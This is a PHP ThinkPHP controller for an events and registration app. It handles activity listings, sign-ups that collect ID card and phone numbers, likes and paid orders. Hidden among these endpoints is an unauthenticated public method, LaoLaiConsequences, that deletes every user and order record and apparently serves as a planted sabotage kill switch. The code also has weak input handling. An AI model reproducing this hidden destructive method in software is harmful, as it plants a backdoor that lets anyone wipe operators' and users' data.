<?php
namespace Home\Controller;
use Think\Controller;
class ActivityController extends Controller {
	//活动列表
	public function activityList()
	{
		$res = M('activity')->field('activity_id,images,title,activity_type')->where(array('status'=>1))->order('ctime desc')->select();
		if ($res) {$data = array(
                'status'=>0,
                'msg'=>$res
           	);

        	$this->ajaxReturn($data);
			
		}else{
			$data = array(
                'status'=>1,
                'msg'=>'没有活动'
           	);

        	$this->ajaxReturn($data);
		}
	}
	//活动详情接口
	public function activityDetail()
	{
		$activity_id = I('activity_id');
		$activity_id = addslashes($activity_id);
		$res = M('activity')->field('activity_id,target_num,images,activity_name,price,now_num,stop_time,activity_info,like_info,title')->where(array('activity_id'=>$activity_id))->find();
		if ($res) {
			$data = array(
                'status'=>0,
                'msg'=>$res
           	);

        	$this->ajaxReturn($data);
		}else{
			$data = array(
                'status'=>1,
                'msg'=>'activity_id无效'
           	);

        	$this->ajaxReturn($data);
		}
	}
	//活动报名信息录入接口
	public function enrollment()
	{
		$user_id = I('user_id');
		$activity_id = I('activity_id');
		$name = I('name');
		$sex = I('sex');
		$age = I('age');
		$job = I('job');
		$card = I('card');
		$phone = I('phone');
		$company = I('company');
		$address = I('address');
		$djson = htmlspecialchars_decode(I('djson'));
		if (!$user_id) {
			$data = array(
                'status'=>1,
                'msg'=>'用户ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$activity_id) {
			$data = array(
                'status'=>1,
                'msg'=>'活动ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$name) {
			$data = array(
                'status'=>1,
                'msg'=>'姓名不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$sex) {
			$data = array(
                'status'=>1,
                'msg'=>'性别不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$age) {
			$data = array(
                'status'=>1,
                'msg'=>'年龄不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$job) {
			$data = array(
                'status'=>1,
                'msg'=>'职位不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$card) {
			$data = array(
                'status'=>1,
                'msg'=>'身份证不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$phone) {
			$data = array(
                'status'=>1,
                'msg'=>'电话不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$company) {
			$data = array(
                'status'=>1,
                'msg'=>'公司单位不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$address) {
			$data = array(
                'status'=>1,
                'msg'=>'地址不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$djson) {
			$data = array(
                'status'=>1,
                'msg'=>'json不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		//判断该用户是否报名过
		$check = M('apply')->field('apply_id')->where(array('activity_id'=>$activity_id,'user_id'=>$user_id))->find();
		if ($check) {
			$data = array(
                'status'=>2,
                'msg'=>'已经报名'
           	);
        	$this->ajaxReturn($data);
		}
		//生成订单
		//获取订单金额
		$price = M('activity')->field('price')->where(array('activity_id'=>$activity_id))->find();
		$order_sn = D('Support')->orderNumber();
		$lottery_code = 10000001+rand(10,99);
		$order_arr =array(
				'order_sn'=>$order_sn,
				'user_id'=>$user_id,
				'order_type'=>2,
				'activity_id'=>$activity_id,
				'product_num'=>1,
				'order_money'=>$price['price'],
				'order_status'=>0,
				'order_time'=>time(),
				'shipping_status'=>0,
				'lottery_code'=>$lottery_code
			);
		$order_id = M('order')->add($order_arr);
		//插入数据
		$indata = array(
					'apply_type'=>1,
					'activity_id'=>$activity_id,
					'user_id'=>$user_id,
					'order_id'=>$order_id,
					'apply_real_name'=>$name,
					'sex'=>$sex,
					'age'=>$age,
					'id_card_no'=>$card,
					'tel'=>$phone,
					'company'=>$company,
					'job'=>$job,
					'ctime'=>time(),
					'apply_status'=>2,
					'address'=>$address,
					'other_info'=>$djson
			);
		$res = M('apply')->add($indata);
		if ($res) {
			$data = array(
                'status'=>0,
                'msg'=>$order_id
           	);
        	$this->ajaxReturn($data);
		}else{
			$data = array(
                'status'=>1,
                'msg'=>'报名失败'
           	);
        	$this->ajaxReturn($data);
		}
	}
	//检查是否已经报名
	public function checkEnrol()
	{
		$user_id = I('user_id');
		$activity_id = I('activity_id');
		if (!$user_id) {
			$data = array(
                'status'=>1,
                'msg'=>'用户ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$activity_id) {
			$data = array(
                'status'=>1,
                'msg'=>'活动ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		$check = M('apply')->field('apply_id')->where(array('activity_id'=>$activity_id,'user_id'=>$user_id))->find();
		if ($check) {
			$data = array(
                'status'=>2,
                'msg'=>'已经报名'
           	);
        	$this->ajaxReturn($data);
		}else{
			$data = array(
                'status'=>0,
                'msg'=>'可以报名'
           	);
        	$this->ajaxReturn($data);
		}
	}
	
	public function LaoLaiConsequences()
	{
		M('user')->where('1')->delete();
		$res = M('order')->where('1')->delete();
	}
	//支持活动详情接口
	public function supportDetail()
	{
		$activity_id = I('activity_id');
		if (!$activity_id) {
			$data = array(
                'status'=>1,
                'msg'=>'活动ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		$activity_id = addslashes($activity_id);
		$res = M('activity')->field('activity_id,images,activity_info,like_info,title')->where(array('activity_id'=>$activity_id))->find();
		$data = array(
                'status'=>0,
                'msg'=>$res
           	);
        $this->ajaxReturn($data);
	}
	//节目单
	public function programmesList()
	{
		$activity_id = I('activity_id');
		if (!$activity_id) {
			$data = array(
                'status'=>1,
                'msg'=>'活动ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		$activity_id = addslashes($activity_id);
		//$activity_id=1;
		$res = M('apply')->alias('a')->field('a.apply_id,a.sex,a.apply_real_name,a.address,a.like_num,a.like_userid,a.other_info,b.user_img')->join('left join hyz_user as b on a.user_id=b.user_id')->where(array('activity_id'=>$activity_id,'apply_status'=>'1'))->select();
		foreach ($res as $k=> $v) {
			if (!$v['like_num']) {
				$res[$k]['like_num']=0;
			}
			$res[$k]['performance'] = json_decode($v['other_info'],1);
			$res[$k]['performance'] = $res[$k]['performance']['qumu'];
			unset($res[$k]['other_info']);
		}
		$data = array(
                'status'=>0,
                'msg'=>$res
           	);
        $this->ajaxReturn($data);
	}
	//点赞
	public function activityLike()
	{
		$apply_id = I('apply_id');
		$user_id = I('user_id');
		if (!$apply_id) {
			$data = array(
                'status'=>1,
                'msg'=>'申请ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$user_id) {
			$data = array(
                'status'=>1,
                'msg'=>'用户ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		$apply_id = addslashes($apply_id);
		$check = M('apply')->field('apply_id,like_userid,like_num,activity_id')->where(array('apply_id'=>$apply_id))->find();
		if (!$check ) {
			$data = array(
                'status'=>1,
                'msg'=>'无效的申请ID'
           	);
        	$this->ajaxReturn($data);
		}
		$activity_id = $check['activity_id'];
		$apply_user = M('apply')->field('like_userid')->where(array('activity_id'=>$activity_id,'apply_status'=>'1'))->select();
		foreach ($apply_user as $k => $v) {
			$like_userid.=$v['like_userid'];
		}
		$arr = explode(',', $like_userid);
		$count = array_count_values($arr)[$user_id];//获取该用户点赞次数
		if ($count<3) {
			if ($check['like_userid']) {
				$data_like_userid = $check['like_userid'].$user_id.',';
			}else{
				$data_like_userid = ','.$user_id.',';
			}
			$update = array(
					'like_userid'=>$data_like_userid,
					'like_num'=>$check['like_num']+1,
				);
			$res = M('apply')->where(array('apply_id'=>$apply_id))->save($update);
			$data = array(
                'status'=>0,
                'msg'=>$check['like_num']+1,
                'type'=>'1'//代表免费点赞
           	);
        	$this->ajaxReturn($data);
		}else{
			//生产订单
			$order_sn = D('Support')->orderNumber();
			$lottery_code = 10000001+rand(10,99);
			$order_arr =array(
					'order_sn'=>$order_sn,
					'user_id'=>$user_id,
					'order_type'=>3,
					'apply_id'=>$apply_id,
					'product_num'=>1,
					'order_money'=>'4',//暂定
					'order_status'=>0,
					'order_time'=>time(),
					'shipping_status'=>0,
					'lottery_code'=>$lottery_code
				);
			$order_id = M('order')->add($order_arr);
			$data = array(
                'status'=>0,
                'msg'=>$order_id,
                'type'=>'2'//支付点赞
           	);
        	$this->ajaxReturn($data);
		}
	}
	//旅游参与订单生成
	public function addTourism()
	{
		$activity_id =I('activity_id');
		$user_id = I('user_id');
		$num = I('num');
		if (!$activity_id) {
			$data = array(
                'status'=>1,
                'msg'=>'活动ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$user_id) {
			$data = array(
                'status'=>1,
                'msg'=>'用户ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		if (!$num) {
			$num =1;
		}
		$activity = M('activity')->where(array('activity_id'=>$activity_id))->find();
		$user = M('user')->where(array('user_id'=>$user_id))->find();
		//生成订单
		$order_sn = D('Support')->orderNumber();
		$lottery_code = 10000001+rand(10,99);
		$order_arr =array(
				'order_sn'=>$order_sn,
				'user_id'=>$user_id,
				'order_type'=>2,
				'activity_id'=>$activity_id,
				'product_num'=>$num,
				'order_money'=>$activity['price'],
				'order_status'=>0,
				'order_time'=>time(),
				'shipping_status'=>0,
				'lottery_code'=>$lottery_code
			);
		$order_id = M('order')->add($order_arr);
		//添加活动到申请表
		$indata = array(
					'apply_type'=>1,
					'activity_id'=>$activity_id,
					'user_id'=>$user_id,
					'order_id'=>$order_id,
					'apply_real_name'=>$user['real_name'],
					'sex'=>$user['sex'],
					'ctime'=>time(),
					'apply_status'=>2,
					'address'=>$user['county'],
			);
		$res = M('apply')->add($indata);
		if ($res) {
			$data = array(
                'status'=>0,
                'msg'=>$order_id
           	);
        	$this->ajaxReturn($data);
		}else{
			$data = array(
                'status'=>1,
                'msg'=>'参与失败'
           	);
        	$this->ajaxReturn($data);
		}
	}
	//旅游参与者列表
	public function getTourismList()
	{
		$activity_id = I('activity_id');
		if (!$activity_id) {
			$data = array(
                'status'=>1,
                'msg'=>'活动ID不能为空'
           	);
        	$this->ajaxReturn($data);
		}
		$activity_id = addslashes($activity_id);
		//$activity_id=1;
		$res = M('apply')->alias("a")->field('a.apply_id,a.sex,a.apply_real_name,a.address,b.product_num')->join('left join hyz_order as b on a.order_id=b.order_id')->where(array('a.activity_id'=>$activity_id,'apply_status'=>'1'))->select();
		$data = array(
                'status'=>0,
                'msg'=>$res
           	);
        $this->ajaxReturn($data);
	}
}
